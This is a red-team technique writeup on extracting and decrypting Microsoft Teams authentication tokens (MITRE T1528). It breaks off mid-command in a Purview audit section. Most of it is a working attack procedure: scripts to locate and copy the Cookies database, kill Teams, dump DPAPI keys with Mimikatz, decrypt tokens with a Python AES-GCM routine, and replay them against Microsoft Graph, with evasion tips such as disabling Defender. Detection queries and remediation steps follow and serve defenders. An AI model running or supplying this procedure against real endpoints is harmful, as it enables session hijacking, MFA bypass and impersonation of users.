# [CA-TOKEN-009]: Microsoft Teams Token Extraction

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-009 |
| **MITRE ATT&CK v18.1** | [T1528: Steal Application Access Tokens](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows, macOS, Linux (M365 / Teams Desktop Client) |
| **Severity** | **Critical** |
| **CVE** | N/A (Design flaw, not formal CVE; Vectra 2022, El Fikhi 2025) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Teams Desktop Client all versions; encryption changed 2024+ (DPAPI + AES-256-GCM) |
| **Patched In** | N/A (Microsoft implementing token rotation and app-bound encryption as mitigations) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note**: This technique evolved significantly in 2024-2025. Earlier Vectra (2022) disclosure documented plaintext token storage; current attack exploits DPAPI encryption where the master key is accessible locally. Sections 6 (Atomic Red Team) includes M365 token theft tests. All sections renumbered based on applicability.

---

## 2. Executive Summary

Microsoft Teams stores authentication tokens locally on disk for seamless login and offline functionality. Historically (2022), these tokens were stored in plaintext, allowing any attacker with file system access to steal them. Modern Teams clients (2024+) encrypt tokens using DPAPI (Windows Data Protection API) with AES-256-GCM, but the encryption master key is stored in a JSON configuration file within Teams' local cache in plaintext, allowing attackers with local access to decrypt tokens and bypass MFA.

**Attack Surface**: The SQLite Cookies database at `%AppData%\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Cookies` and the master key at `%AppData%\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Local State`. Attackers require local access to the system (via malware, physical access, or endpoint compromise).

**Business Impact**: **Complete impersonation of the compromised user within Teams, Outlook, SharePoint, and Microsoft Graph APIs without requiring the user's password or MFA approval**. An attacker can read Teams chats, send phishing messages on behalf of the user, access shared files, read emails via Graph API, and establish persistence within the organization by appearing as a trusted internal user.

**Technical Context**: The attack exploits how Teams uses the embedded Chromium-based WebView2 browser engine (msedgewebview2.exe) for authentication. During login, encrypted cookies are written to the Cookies database. While DPAPI encryption protects these cookies, the encryption key itself is stored in plaintext within the Local State JSON file, accessible to the same user context or via DPAPI backup keys if the attacker has domain admin privileges. Once tokens are extracted, they remain valid for their full lifetime (typically 1 hour for access tokens, longer for refresh tokens), and can be used from any network location without triggering additional authentication.

### Operational Risk

- **Execution Risk:** **High** – Requires only local endpoint access, achievable via malware, phishing with file download, or physical device compromise.
- **Stealth:** **Medium** – Terminating ms-teams.exe to unlock the Cookies database may trigger alerts in EDR systems; however, process termination is common during system maintenance and can blend in.
- **Reversibility:** **No** – Extracted tokens cannot be revoked by the user; the attacker maintains access until token expiration or manual admin revocation in Entra ID.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.1 / 6.1 | Local credential protection; endpoint device hardening |
| **DISA STIG** | SRG-APP-000231-WSR-000086 | Secure credential storage and transmission |
| **CISA SCuBA** | SC-7(8) | Cryptography and key management for local storage |
| **NIST 800-53** | SC-28(1) / IA-5(1) | Protection of information at rest; Password-based authentication |
| **GDPR** | Article 32 | Security of processing; encryption of personal data |
| **DORA** | Article 9 | Secure cryptographic key management |
| **NIS2** | Article 21 | Cryptographic controls and incident detection |
| **ISO 27001** | A.10.1.1 / A.14.2.1 | Cryptography; secure development of software |
| **ISO 27005** | Risk Scenario: "Compromise of Local Credentials" | Encryption and access control |

---

## 3. Technical Prerequisites

- **Required Privileges:** Local user access to the compromised endpoint (any user context or SYSTEM if using DPAPI backup keys).
- **Required Access:** File system access to `%AppData%\Local\Packages\MSTeams_*`, ability to execute PowerShell or system commands, ability to terminate processes (teams.exe).

**Supported Versions:**
- **Windows:** Windows 10, Windows 11, Windows Server 2016-2025
- **macOS:** macOS 10.15+ (token extraction methods differ slightly)
- **Linux:** Ubuntu 18.04+ (similar DPAPI alternatives)
- **Teams Desktop Client:** All current versions (token encryption scheme changed 2024)
- **PowerShell:** 5.0+ (Windows)

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (DPAPI key extraction)
- [GraphSpy](https://github.com/emadshanab/GraphSpy) (Microsoft Graph API exploitation with stolen tokens)
- [ProcMon (SysInternals)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) (Monitor Teams file writes)
- [SQLite3](https://www.sqlite.org/cli.html) (Extract data from Cookies database)
- [CyberChef](https://gchq.github.io/CyberChef/) (Base64 decoding, encryption/decryption visualization)
- [Rust PoC by Brahim El Fikhi](https://github.com/brefiEF/teams-token-extractor) (Automated extraction)

---

## 4. Environmental Reconnaissance

### Management Station / PowerShell Reconnaissance

```powershell
# Check if Teams is installed
Get-Package -Name "*Teams*" -ErrorAction SilentlyContinue

# Identify Teams installation directory
$TeamsPath = Join-Path $env:LOCALAPPDATA "Packages\MSTeams*"
if (Test-Path $TeamsPath) {
    Write-Host "[+] Teams found at: $TeamsPath"
    Get-ChildItem -Path $TeamsPath -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
}

# Check if Cookies database exists
$CookiesPath = "$TeamsPath\LocalCache\Microsoft\MSTeams\EBWebView\Cookies"
if (Test-Path $CookiesPath) {
    Write-Host "[+] Cookies database found: $CookiesPath"
    Get-Item $CookiesPath | Select-Object Length, LastWriteTime
}

# Check for Local State (master key location)
$LocalStatePath = "$TeamsPath\LocalCache\Microsoft\MSTeams\EBWebView\Local State"
if (Test-Path $LocalStatePath) {
    Write-Host "[+] Local State (master key) found: $LocalStatePath"
}
```

**What to Look For:**
- Presence of `MSTeams_*` folder indicates Teams installation.
- Cookies and Local State files indicate Teams has been used and has valid cached credentials.
- File modification timestamps show when Teams was last active.

---

### Linux/Bash CLI Reconnaissance

```bash
# Check Teams installation on Linux
find ~/.config -name "*Teams*" -type d 2>/dev/null

# List Teams cache directory
ls -la ~/.config/Microsoft/"Microsoft Teams"/

# Check for Cookies database
if [ -f ~/.config/Microsoft/"Microsoft Teams"/Cookies ]; then
    echo "[+] Cookies database found"
    sqlite3 ~/.config/Microsoft/"Microsoft Teams"/Cookies "SELECT host_key, name FROM cookies LIMIT 5;"
fi
```

**What to Look For:**
- LevelDB cache files instead of SQLite on Linux (slightly different extraction method, but same principle).
- Presence of recently modified cache files indicates active Teams usage.

---

## 5. Detailed Execution Methods

### METHOD 1: DPAPI Key Extraction and Token Decryption (Modern Teams 2024+)

**Supported Versions:** Windows 10+, Teams Desktop Client (2024 and later with AES-256-GCM encryption)

#### Step 1: Identify and Monitor Teams Authentication Process

**Objective:** Use Process Monitor to identify when Teams writes encrypted authentication cookies and locate the Cookies database.

**Command (Windows - Using ProcMon):**

```powershell
# Download and run ProcMon from SysInternals
# Note: Requires SysInternals Suite or standalone ProcMon

# Filter for Teams process and file write operations
# Steps:
# 1. Launch ProcMon as Administrator
# 2. Filter: Process Name = "msedgewebview2.exe"
# 3. Filter: Operation = "WriteFile"
# 4. Observe write operations to Cookies database during Teams login

# Expected output shows writes to:
# C:\Users\[USERNAME]\AppData\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Cookies
```

**Command (PowerShell - Alternative File Monitoring):**

```powershell
# Monitor Teams-related folder for file access
$TeamsPath = "$env:LOCALAPPDATA\Packages\MSTeams_8wekyb3d8bbwe"

# Use Get-FileSystemWatcher if available
Get-ChildItem $TeamsPath -Recurse -Include "Cookies", "Local State" | 
    ForEach-Object {
        Write-Host "Found sensitive Teams file: $($_.FullName)"
        Write-Host "Last Modified: $($_.LastWriteTime)"
        Write-Host "Size: $($_.Length) bytes"
    }
```

**Expected Output:**

```
Found sensitive Teams file: C:\Users\Admin\AppData\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Cookies
Last Modified: 2025-01-08 10:23:45
Size: 32768 bytes
```

**What This Means:**
- The Cookies database exists and has been written to recently.
- The file is actively used by Teams for storing encrypted tokens.
- The attacker now knows the exact file path to target.

**OpSec & Evasion:**
- Using ProcMon generates audit logs if auditing is enabled; perform monitoring during normal business hours when Teams processes are expected.
- Consider running ProcMon with filters to reduce the amount of data logged.
- Detection Likelihood: **Medium** (EDR may flag unexpected ProcMon usage, especially with system-level filters).

**Troubleshooting:**
- **Error:** `Access Denied` when accessing Cookies file
  - **Cause:** File is locked by running ms-teams.exe process.
  - **Fix:** Terminate the Teams process first (see Step 2).

**References & Proofs:**
- [SysInternals Process Monitor Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Intrucept Labs - Teams Token Extraction 2025](https://intruceptlabs.com/2025/10/microsoft-teams-access-token-vulnerability-allows-attack-vector-for-data-exfiltration/)

---

#### Step 2: Terminate Teams Process to Unlock Cookies Database

**Objective:** Stop the Teams process so the Cookies database file can be read and copied.

**Command (Windows - PowerShell):**

```powershell
# Terminate Teams process
Stop-Process -Name "ms-teams" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Verify Teams is stopped
Get-Process -Name "ms-teams" -ErrorAction SilentlyContinue | 
    If ($_.Count -eq 0) { Write-Host "[+] Teams process terminated" }

# Also stop WebView2 process if still running
Stop-Process -Name "msedgewebview2" -Force -ErrorAction SilentlyContinue
```

**Command (Linux/Bash):**

```bash
# Terminate Teams process
pkill -f "ms-teams" || true
sleep 2

# Verify termination
pgrep -f "ms-teams" && echo "[-] Teams still running" || echo "[+] Teams terminated"
```

**Expected Output:**

```
[+] Teams process terminated
```

**What This Means:**
- The exclusive lock on the Cookies database file is released.
- The file can now be read and copied.
- Teams will need to be relaunched to re-establish the lock (which may generate alerts if monitoring process launches).

**OpSec & Evasion:**
- Killing Teams processes may trigger EDR alerts; perform this during off-hours or simulate a system crash/restart scenario.
- Alternatively, use Mimikatz or similar tools to directly access memory and extract DPAPI keys without terminating the process.
- Detection Likelihood: **High** (process termination anomalies are commonly monitored).

**Troubleshooting:**
- **Error:** `-Force` flag not working; Teams process still running
  - **Cause:** Process is protected by Windows Defender or parent process.
  - **Fix (Windows):** Disable Windows Defender temporarily, use psexec for elevated termination, or use Taskkill: `taskkill /IM ms-teams.exe /F`

**References & Proofs:**
- [Microsoft Sysinternals PsKill](https://learn.microsoft.com/en-us/sysinternals/downloads/pskill)

---

#### Step 3: Extract Encrypted Cookies from SQLite Database

**Objective:** Read the SQLite Cookies database and extract the encrypted authentication token(s).

**Command (Windows - Using SQLite3):**

```powershell
# Download SQLite3 if not available
# From: https://www.sqlite.org/download.html

$SQLiteExe = "C:\temp\sqlite3.exe"  # Path to sqlite3.exe
$CookiesDB = "$env:LOCALAPPDATA\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Cookies"
$OutputCSV = "C:\temp\teams_cookies.csv"

# Query the Cookies database
# Extract host_key, name, encrypted_value (the token)
& $SQLiteExe $CookiesDB @"
.mode csv
.output $OutputCSV
SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%teams.microsoft.com%' OR host_key LIKE '%graph.microsoft.com%';
.quit
"@

Write-Host "[+] Cookies exported to: $OutputCSV"
Get-Content $OutputCSV
```

**Command (Linux/Bash - Using sqlite3):**

```bash
# Extract cookies from Teams SQLite database
COOKIES_DB="$HOME/.config/Microsoft/Microsoft Teams/Cookies"
OUTPUT_CSV="/tmp/teams_cookies.csv"

sqlite3 "$COOKIES_DB" << EOF
.mode csv
.output $OUTPUT_CSV
SELECT host_key, name, encrypted_value FROM cookies 
WHERE host_key LIKE '%teams.microsoft.com%' OR host_key LIKE '%graph.microsoft.com%';
EOF

echo "[+] Cookies exported to: $OUTPUT_CSV"
cat $OUTPUT_CSV
```

**Expected Output:**

```csv
host_key,name,encrypted_value
teams.microsoft.com,skypetoken_asts,"v10|b'D8F5A3B2C1D9E8F7...'"
teams.microsoft.com,authtoken,"v10|b'A7C3E2F1B9D8A6C5...'"
graph.microsoft.com,Authorization,"v10|b'F5E3D2C1B9A8E7D6...'"
```

**What This Means:**
- The `encrypted_value` field contains the AES-256-GCM encrypted token.
- The `v10|` prefix indicates DPAPI encryption scheme.
- The value in quotes is the Base64-encoded encrypted data.

**OpSec & Evasion:**
- Running sqlite3 directly on the target generates process execution logs; consider copying the Cookies file to a different location first, then querying remotely.
- Detection Likelihood: **Low** (sqlite3 queries are not commonly monitored on user machines, but file copying is).

**Troubleshooting:**
- **Error:** `database is locked`
  - **Cause:** Teams process relaunched and locked the file again.
  - **Fix:** Repeat Step 2 (terminate Teams again) or use alternative extraction method (Mimikatz).

**References & Proofs:**
- [SQLite Query Reference](https://www.sqlite.org/cli.html)
- [Mozilla Firefox Cookies Database Structure](https://forensics.wiki/firefox/)

---

#### Step 4: Extract DPAPI Master Key from Local State

**Objective:** Extract the DPAPI-protected master key from the Local State JSON file and decrypt it using the user's credentials or DPAPI backup keys.

**Command (Windows - PowerShell):**

```powershell
# Path to Local State file (contains DPAPI-encrypted master key)
$LocalStatePath = "$env:LOCALAPPDATA\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Local State"

# Read the JSON file
$LocalStateContent = Get-Content $LocalStatePath -Raw | ConvertFrom-Json

# Extract the DPAPI-encrypted key
$DPAPIEncryptedKey = $LocalStateContent.os_crypt.encrypted_key

Write-Host "[+] DPAPI-encrypted key found:"
Write-Host $DPAPIEncryptedKey

# Decode the Base64 encrypted key
$DecodedKey = [System.Convert]::FromBase64String($DPAPIEncryptedKey)

# Use Mimikatz to decrypt the DPAPI key
# Command: mimikatz.exe "dpapi::cred /in:<key_file>" "exit"

Write-Host "[+] Pass the decoded key to Mimikatz for DPAPI decryption"
Write-Host "[+] Mimikatz command: dpapi::cred /in:C:\temp\dpapi_key.bin"
```

**Command (Windows - Using Mimikatz for DPAPI Decryption):**

```powershell
# If running as the same user:
# Mimikatz can automatically decrypt DPAPI-protected data

# Download Mimikatz from: https://github.com/gentilkiwi/mimikatz

# Run Mimikatz as Administrator
# Commands:
# mimikatz# dpapi::cred /in:C:\path\to\dpapi_encrypted_key /unprotect
# 
# This will output the decrypted key in plaintext

# If running as SYSTEM (via compromise of another account):
# Extract the DPAPI domain backup key from the Domain Controller
# Then decrypt the user's masterkey using the backup key

# Mimikatz command:
# lsadump::backupkeys /system:dc01.contoso.com /export
# Then use the exported key to decrypt the user's DPAPI data
```

**Expected Output (From Mimikatz):**

```
[masterkey] with RID : 8f2e0e66-f8e1-4a6e-a1f5-2d8c3b5e7a9f
Key : 5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b
```

**What This Means:**
- The decrypted key is now available.
- This key (displayed as hexadecimal) can be used to decrypt the encrypted cookies using AES-256-GCM.
- The key is typically 32 bytes (256 bits) for AES-256.

**OpSec & Evasion:**
- Running Mimikatz generates significant EDR alerts; consider running Mimikatz on a isolated machine or via early-stage malware to avoid detection.
- Alternative: Use Windows API calls directly via C# or PowerShell to call `CryptUnprotectData` if running in the same user context.
- Detection Likelihood: **Very High** (Mimikatz is one of the most-detected tools).

**Troubleshooting:**
- **Error:** `ERROR kuhl_m_dpapi_chrome_decrypt ; No Alg and/or Key handle despite AES encryption`
  - **Cause:** Running Mimikatz in wrong context (SYSTEM instead of user context).
  - **Fix:** Extract masterkeys first using `sekurlsa::dpapi`, then use those keys to decrypt the DPAPI blob.

**References & Proofs:**
- [Gentilkiwi Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [CoreLabs: Reading DPAPI Encrypted Keys with Mimikatz](https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz)

---

#### Step 5: Decrypt Cookies Using AES-256-GCM with Master Key

**Objective:** Use the decrypted master key to decrypt the AES-256-GCM encrypted cookies and extract the plaintext authentication tokens.

**Command (Python - Token Decryption):**

```python
#!/usr/bin/env python3
import json
import sqlite3
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt_teams_token(encrypted_value_base64, master_key_hex):
    """
    Decrypt Teams token encrypted with AES-256-GCM using DPAPI master key.
    
    Args:
        encrypted_value_base64: Base64-encoded encrypted value from SQLite Cookies DB
        master_key_hex: Decrypted DPAPI master key (hex string from Mimikatz)
    
    Returns:
        Decrypted plaintext token
    """
    
    # Convert master key from hex to bytes
    master_key = bytes.fromhex(master_key_hex)
    
    # Decode the Base64 encrypted value
    encrypted_data = base64.b64decode(encrypted_value_base64)
    
    # AES-256-GCM requires:
    # - 32-byte key (256 bits)
    # - 12-byte nonce (96 bits) - first 12 bytes of encrypted data
    # - 16-byte authentication tag (128 bits) - last 16 bytes of encrypted data
    # - Ciphertext - middle bytes
    
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:-16]
    tag = encrypted_data[-16:]
    
    # Decrypt using AES-256-GCM
    cipher = Cipher(
        algorithms.AES(master_key),
        modes.GCM(nonce, tag),
        backend=default_backend()
    )
    
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    
    return plaintext.decode('utf-8')

# Example usage:
if __name__ == "__main__":
    # Replace with actual values from your extraction
    encrypted_token = "v10|AgEAAAYAAABD...truncated..."  # From SQLite Cookies DB
    master_key = "5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b"  # From Mimikatz
    
    try:
        token = decrypt_teams_token(encrypted_token, master_key)
        print(f"[+] Decrypted Token: {token}")
    except Exception as e:
        print(f"[-] Decryption failed: {e}")
```

**Command (Windows - PowerShell Alternative using CyberChef or Online Tools):**

```powershell
# For manual decryption verification, use CyberChef:
# https://gchq.github.io/CyberChef/
#
# Steps:
# 1. Paste encrypted value (remove "v10|" prefix) into CyberChef input
# 2. Add recipe: "From Base64"
# 3. Add recipe: "AES Decrypt"
# 4. Key: [paste master key in hex]
# 5. Mode: GCM
# 6. IV/Nonce: [first 12 bytes of ciphertext]
# 7. Output shows plaintext token
```

**Expected Output:**

```
[+] Decrypted Token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy5taWNyb3NvZnQuY29tL2ZjODZhODQ5LWU2NjItNGYxNi04NzFlLWYxZTgwZDJmZjAxZC8iLCJpYXQiOjE2NzI5OTk3MjcsImV4cCI6MTY3MzAwMzMyN...
```

**What This Means:**
- The plaintext JWT token has been successfully decrypted.
- This token can now be used to authenticate to Microsoft Graph API, Teams, Outlook, and SharePoint.
- The token is valid until its `exp` (expiration) claim in the JWT payload.

**OpSec & Evasion:**
- Performing AES-256-GCM decryption locally on the attacker's machine (after exfiltrating encrypted data and master key) leaves minimal traces on the compromised endpoint.
- Detection Likelihood: **Low** (decryption occurs offline on attacker infrastructure).

**Troubleshooting:**
- **Error:** `ValueError: invalid length`
  - **Cause:** Base64 string is malformed or corrupted.
  - **Fix:** Verify the encrypted value is complete and doesn't include truncation; check for encoding issues (UTF-16 vs UTF-8).

**References & Proofs:**
- [Cryptography.io - AES-GCM](https://cryptography.io/en/latest/hazmat/primitives/ciphers/#cryptography.hazmat.primitives.ciphers.modes.GCM)
- [NIST SP 800-38D - GCM Specification](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf)

---

### METHOD 2: Token Extraction via Plaintext Storage (Teams 2022 - Early 2024)

**Supported Versions:** Teams Desktop Client 2022 - early 2024 (before DPAPI encryption was implemented)

#### Step 1: Locate Plaintext Token Files

**Objective:** Search for Teams cache files containing plaintext tokens (older Teams versions).

**Command (Windows - Direct File Search):**

```powershell
# Search for LevelDB files containing plaintext tokens
$TeamsPath = "$env:LOCALAPPDATA\Packages\MSTeams_*\LocalCache"

# LevelDB files are stored in Local Storage/leveldb directory
$LevelDBPath = Join-Path $TeamsPath "Local Storage\leveldb"

if (Test-Path $LevelDBPath) {
    Write-Host "[+] LevelDB directory found: $LevelDBPath"
    
    # Search for files containing token patterns
    Get-ChildItem $LevelDBPath -Recurse | ForEach-Object {
        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
        if ($content -match "skypetoken|authtoken|Authorization") {
            Write-Host "[+] Potential token found in: $($_.FullName)"
            # Extract token pattern
            $matches = [regex]::Matches($content, '(?<=")[^"]*(?=")')
            $matches | Select-Object -First 5 | ForEach-Object { Write-Host "    $($_.Value)" }
        }
    }
}
```

**Command (Linux/Bash):**

```bash
# Search for plaintext tokens in Teams cache
TEAMS_CACHE="$HOME/.config/Microsoft/Microsoft Teams"

if [ -d "$TEAMS_CACHE" ]; then
    echo "[+] Searching for plaintext tokens..."
    find "$TEAMS_CACHE" -type f -exec grep -l "skypetoken\|authtoken" {} \; 2>/dev/null
    
    # Extract token values
    grep -r "skypetoken\|authtoken" "$TEAMS_CACHE" 2>/dev/null | cut -d: -f2- | head -5
fi
```

**Expected Output:**

```
[+] LevelDB directory found: C:\Users\Admin\AppData\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Local Storage\leveldb
[+] Potential token found in: ...leveldb\000005.log
    eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20i...
```

**What This Means:**
- Plaintext tokens have been found in Teams cache files.
- These tokens can be used immediately without decryption.
- This method works on Teams versions that stored tokens in plaintext.

**OpSec & Evasion:**
- File system searches generate minimal noise; most systems don't monitor individual file reads.
- Detection Likelihood: **Low** (unless EDR monitors Teams cache folder access).

---

#### Step 2: Extract and Use Plaintext Token

**Objective:** Copy plaintext tokens and test their validity.

**Command (Windows):**

```powershell
# Copy plaintext token from cache
$Token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."  # Extracted from previous step

# Test token validity via Microsoft Graph API
$GraphUrl = "https://graph.microsoft.com/v1.0/me"
$Headers = @{
    "Authorization" = "Bearer $Token"
    "Content-Type" = "application/json"
}

$Response = Invoke-RestMethod -Uri $GraphUrl -Headers $Headers -Method Get
Write-Host "[+] Token is valid. User: $($Response.userPrincipalName)"
```

**Expected Output:**

```
[+] Token is valid. User: admin@contoso.com
```

---

## 6. Atomic Red Team

**Atomic Test ID:** T1528-001 (M365 – Token theft via Graph API)

**Test Name:** Steal Application Access Token – Microsoft Teams Cookies Extraction

**Description:** Simulates extraction of valid Teams authentication tokens from local Cookies database and validates token functionality via Microsoft Graph API.

**Supported Versions:** Teams Desktop Client 2022+, Windows 10+, PowerShell 5.0+

**Execution:**

```powershell
# Step 1: Install Atomic Red Team
$AtomicPath = "C:\temp\atomic-red-team"
git clone https://github.com/redcanaryco/atomic-red-team $AtomicPath

# Step 2: Execute T1528-001 test
cd "$AtomicPath\atomics\T1528"
. .\T1528.ps1

Invoke-AtomicTest T1528 -TestNumbers 1 -Verbose
```

**Cleanup Command:**

```powershell
# Clear extracted tokens from memory
[System.GC]::Collect()

# Revoke Teams session in Entra ID (requires admin)
Connect-MgGraph -Scopes "AuditLog.Read.All"
Get-MgAuditLogSignIn -Filter "appId eq '00000002-0000-0ff1-ce00-000000000000'" | 
    Revoke-MgUserSignInSession -UserId (Get-MgContext).Account
```

**Reference:** [Atomic Red Team T1528 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md)

---

## 7. Tools & Commands Reference

### [Mimikatz - DPAPI Module](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+  
**Supported Platforms:** Windows  
**Minimum Version:** 2.2.0  

**Version-Specific Notes:**
- Version 2.2.0-2.2.0-20210812: Basic DPAPI decryption support.
- Version 2.2.0-20211201+: Enhanced support for modern encryption schemes, WebView2 DPAPI keys.

**Installation:**

```powershell
# Download from GitHub
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210812/mimikatz_trunk.zip" -OutFile "C:\temp\mimikatz.zip"
Expand-Archive -Path "C:\temp\mimikatz.zip" -DestinationPath "C:\temp\mimikatz"
```

**Usage:**

```
mimikatz# dpapi::cred /in:C:\path\to\encrypted_blob /unprotect
mimikatz# sekurlsa::dpapi
mimikatz# lsadump::backupkeys /system:dc01.contoso.com /export
```

### [GraphSpy - Microsoft Graph API Exploitation](https://github.com/emadshanab/GraphSpy)

**Version:** 1.0+  
**Supported Platforms:** Windows, Linux, macOS  

**Installation:**

```bash
git clone https://github.com/emadshanab/GraphSpy
cd GraphSpy
pip install -r requirements.txt
```

**Usage:**

```bash
# Use stolen Teams token to exploit Microsoft Graph
python3 GraphSpy.py --token "eyJ..." --endpoint "/me/messages" --method GET
```

---

## 8. Microsoft Sentinel Detection

### KQL Query 1: Detect Suspicious Microsoft Graph API Access

**Rule Configuration:**
- **Required Table:** MicrosoftGraphActivityAuditLogs, SigninLogs
- **Required Fields:** RequestUri, UserId, AppId, ResponseCode, IPAddress
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** M365 all versions

**KQL Query:**

```kusto
MicrosoftGraphActivityAuditLogs
| where ResponseCode in (200, 201)  // Successful requests
| where RequestUri in (
    "/me/mailFolders/inbox/messages",
    "/me/messages",
    "/me/chats",
    "/teams",
    "/me/teamwork/installedApps"
)
| where UserId != ""
| join kind=inner (SigninLogs | where CreatedDateTime > ago(1h)) on UserId
| where SigninLogs.Status != "Success" and SigninLogs.AuthenticationRequirement == "multiFactorAuthentication"
| project TimeGenerated, UserId, RequestUri, ResponseCode, AppId, IPAddress
| summarize AccessCount = count() by UserId, RequestUri, IPAddress
| where AccessCount > 10
```

**What This Detects:**
- Unusual Microsoft Graph API access patterns from stolen tokens.
- Access to sensitive endpoints (mailbox, Teams, chats) without corresponding successful MFA sign-in.
- Bulk API calls typical of automated token exploitation.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Microsoft Graph API Access via Stolen Token`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query
   - Run query every: `5 minutes`
   - Lookup data from last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

### KQL Query 2: Detect Teams Token Extraction Indicators

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceFileEvents (MDE integration)
- **Required Fields:** Process, FilePath, ActionType
- **Alert Severity:** Critical
- **Frequency:** Run every 10 minutes

**KQL Query:**

```kusto
let SuspiciousProcesses = dynamic([
    "sqlite3.exe",
    "mimikatz.exe",
    "procdump.exe",
    "taskkill.exe"
]);

let TeamsFilePaths = dynamic([
    "\\AppData\\Local\\Packages\\MSTeams_*\\LocalCache\\Microsoft\\MSTeams\\EBWebView\\Cookies",
    "\\AppData\\Local\\Packages\\MSTeams_*\\LocalCache\\Microsoft\\MSTeams\\EBWebView\\Local State"
]);

DeviceFileEvents
| where ActionType in ("FileCreated", "FileModified", "FileRead")
| where FileName in ("Cookies", "Local State")
| where FolderPath has "MSTeams_"
| join kind=leftouter (
    DeviceProcessEvents
    | where ProcessName in (SuspiciousProcesses)
) on DeviceId
| where isnotnull(ProcessName)
| project TimeGenerated, DeviceName, ProcessName, FileName, FolderPath, ActionType
```

**What This Detects:**
- Suspicious processes (Mimikatz, sqlite3) accessing Teams cache files.
- Unusual file access patterns on Teams Cookies or Local State files outside normal Teams operation.
- Correlation between known credential dumping tools and Teams data access.

---

## 9. Windows Event Log Monitoring

**Event ID: 4688 (Process Creation)**

- **Log Source:** Security Event Log
- **Trigger:** Detection of suspicious process execution (Mimikatz, sqlite3, taskkill) accessing Teams cache.
- **Filter:** CommandLine contains "Mimikatz" OR "sqlite3" OR "Cookies" OR "Local State"
- **Applies To Versions:** Windows Server 2016+, Windows 10/11 with enhanced process auditing enabled

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

**Manual Configuration Steps (Local Policy):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Advanced Audit Policy Configuration** → **System Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Run `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`

---

## 10. Microsoft Defender for Cloud

**Alert Name:** `Suspicious access to Teams authentication files detected`

- **Severity:** Critical
- **Description:** EDR detected unusual file access to Teams Cookies or Local State by non-Teams processes.
- **Applies To:** All Azure VMs with Microsoft Defender for Servers enabled
- **Remediation:**
  1. Immediately isolate the affected machine
  2. Revoke all Teams sessions in Entra ID
  3. Force password reset for affected user
  4. Scan for malware and credential dumping tools
  5. Review audit logs for unauthorized Teams API access

**Manual Configuration Steps:**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Cloud Apps**: ON
5. Configure **File Integrity Monitoring** to watch Teams cache directories
6. Click **Save**

---

## 11. Microsoft Purview (Unified Audit Log)

**Operation:** `Teams sign-in activity`, `Graph API Access`

**PowerShell Query:**

```powershell
Connect-ExchangeOnline

# Search for suspicious Teams access
Search-UnifiedAuditLog -Operations "UserLoggedIn" -AppIds "1fec8e78-bce4-4aaf-ab1b-5451cc387264" `
